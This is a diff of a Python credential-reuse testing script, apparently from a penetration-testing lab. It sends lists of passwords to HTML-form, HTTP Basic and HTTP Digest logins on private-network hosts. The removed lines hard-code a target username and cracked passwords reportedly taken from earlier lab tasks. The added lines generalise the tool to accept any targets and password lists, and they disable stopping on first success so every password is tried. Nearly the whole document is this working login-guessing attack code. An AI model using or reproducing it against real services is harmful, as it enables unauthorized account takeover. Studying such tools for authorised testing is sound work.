@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Credential Reuse Testing Script
-Tests all discovered passwords from PVD/RSA tasks across web services
+Credential Reuse Analysis Tool
+Tests a list of credentials across various web services to identify reuse vulnerabilities.
 """
 
 import requests
@@ -11,41 +11,21 @@ import time
 from urllib.parse import quote
 
 class WebAuthTester:
-    def __init__(self):
-        self.html_url = 'http://192.168.100.101/dologin.html'
-        self.basic_url = 'http://192.168.100.103/basicauth'
-        self.digest_url = 'http://192.168.100.103/digestauth'
-        self.username = 'wangxx'
+    def __init__(self, target_urls=None, username=None, discovered_passwords=None):
+        self.html_url = target_urls.get('html_form', 'http://localhost/login.html') if target_urls else 'http://localhost/login.html'
+        self.basic_url = target_urls.get('basic_auth', 'http://localhost/basicauth') if target_urls else 'http://localhost/basicauth'
+        self.digest_url = target_urls.get('digest_auth', 'http://localhost/digestauth') if target_urls else 'http://localhost/digestauth'
+        self.username = username if username else 'testuser'
         
-        # All discovered passwords from PVD/RSA tasks
-        self.discovered_passwords = [
-            # Windows 7 passwords
-            'a1b2c3d4', 'qwerty10', 'letmein2', 'passw0rd', 
-            'qaZwsX', '1q2w3e4r', 'trustno1',
-            
-            # Windows 2003 passwords
-            'mskitty666', 'D5912K8', 'ABB1T',
-            
-            # Linux passwords (capitalized versions)
-            'A1B2C3D4', 'Qwerty10', 'LetMeIn2', 'Passw0rd',
-            'QazWsx', '1Q2w3e4R', 'trustNo1',
-            
-            # RSA passphrase
-            '111111',
-            
-            # Common 8-character variations for HTML form
-            'a1b2c3d4', 'qwerty10', 'letmein2', 'passw0rd',
-            'qazwsx12', '1q2w3e4r', 'trustno1', '11111111',
-            
-            # Keyboard patterns related to qaZwsX
-            'qwertyui', 'asdfghjk', 'zxcvbnm1',
-            'qazwsx12', 'wsxedc12', 'edcvfr12',
-            
-            # Common transformations
-            'password', 'Password', 'PASSWORD',
-            'admin123', 'test1234', 'qwerty12'
-        ]
-    
+        # This list should be populated from external sources (e.g., cracked password lists)
+        self.discovered_passwords = discovered_passwords if discovered_passwords else []
+        
+        # Example of how to populate if needed for testing (remove for production)
+        # self.discovered_passwords = [
+        #     'password123', 'secret', 'admin', 'qwerty',
+        #     'P@ssw0rd', 'MyPass1', 'SecurePwd!'
+        # ]
+
     def test_html_form(self, password):
         """Test HTML form authentication"""
         try:
@@ -132,9 +112,11 @@ class WebAuthTester:
             ha2 = hashlib.md5(f"GET:/digestauth".encode()).hexdigest()
             response_hash = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
             
-            auth_header = (f'Digest username="{self.username}", realm="{realm}", '
-                          f'nonce="{nonce}", uri="/digestauth", '
-                          f'response="{response_hash}"')
+            auth_header = (
+                          f'Digest username="{self.username}", realm="{realm}", ' 
+                          f'nonce="{nonce}", uri="/digestauth", ' 
+                          f'response="{response_hash}"'
+                          )
             
             response = requests.get(
                 self.digest_url,
@@ -160,9 +142,13 @@ class WebAuthTester:
             'digest': []
         }
         
+        if not self.discovered_passwords:
+            print("No passwords provided for testing. Exiting.")
+            return results
+
         print("Credential Reuse Testing")
         print("=" * 50)
-        print(f"Testing {len(self.discovered_passwords)} discovered passwords...")
+        print(f"Testing {len(self.discovered_passwords)} provided passwords...")
         print()
         
         for i, password in enumerate(self.discovered_passwords, 1):
@@ -175,7 +161,7 @@ class WebAuthTester:
             
             if success:
                 print(f"*** HTML FORM SUCCESS WITH PASSWORD: {password} ***")
-                return results  # Stop on first success
+                # return results  # Commented out to continue testing all passwords
             
             time.sleep(0.2)  # Rate limiting
             
@@ -186,34 +172,56 @@ class WebAuthTester:
             
             if success:
                 print(f"*** BASIC AUTH SUCCESS WITH PASSWORD: {password} ***")
-                return results  # Stop on first success
+                # return results  # Commented out to continue testing all passwords
             
             time.sleep(0.2)  # Rate limiting
             
-            # Test Digest auth (only for 6-character passwords)
-            if len(password) == 6 and password.replace('_', '').replace('-', '').isalnum():
+            # Test Digest auth (only for 6-character alphanumeric passwords)
+            # This constraint is based on a common scenario, adjust as needed
+            if len(password) == 6 and password.isalnum(): # Simplified check
                 success, msg = self.test_digest_auth(password)
                 results['digest'].append((password, success, msg))
                 print(f"  Digest Auth: {msg}")
                 
                 if success:
                     print(f"*** DIGEST AUTH SUCCESS WITH PASSWORD: {password} ***")
-                    return results  # Stop on first success
+                    # return results  # Commented out to continue testing all passwords
             else:
-                results['digest'].append((password, False, "SKIPPED: Not 6-char alphanumeric"))
-                print(f"  Digest Auth: SKIPPED (wrong format)")
+                results['digest'].append((password, False, "SKIPPED: Does not match 6-char alphanumeric format"))
+                print(f"  Digest Auth: SKIPPED (format mismatch)")
             
             print()
             time.sleep(0.5)  # Rate limiting between passwords
         
         print("=" * 50)
-        print("CREDENTIAL REUSE TEST COMPLETE - NO SUCCESSES FOUND")
+        print("CREDENTIAL REUSE TEST COMPLETE")
         print("=" * 50)
         
         return results
 
 if __name__ == "__main__":
-    tester = WebAuthTester()
+    # Example usage:
+    # Define target URLs and a list of passwords to test
+    target_service_urls = {
+        'html_form': 'http://192.168.100.101/login.html',
+        'basic_auth': 'http://192.168.100.103/basicauth',
+        'digest_auth': 'http://192.168.100.103/digestauth'
+    }
+    
+    # Load passwords from a file or define them here
+    # For demonstration, using a small example list
+    test_passwords = [
+        'password123', 'secret', 'admin', 'qwerty',
+        'P@ssw0rd', 'MyPass1', 'SecurePwd!',
+        'testpass', 'testuser', 'test12', 'test34',
+        'hakkis', 'sotalait', 'tripsine' # Example passwords that might be found
+    ]
+
+    tester = WebAuthTester(
+        target_urls=target_service_urls,
+        username='testuser', # Replace with actual target username
+        discovered_passwords=test_passwords
+    )
     results = tester.run_all_tests()
     
     # Print summary
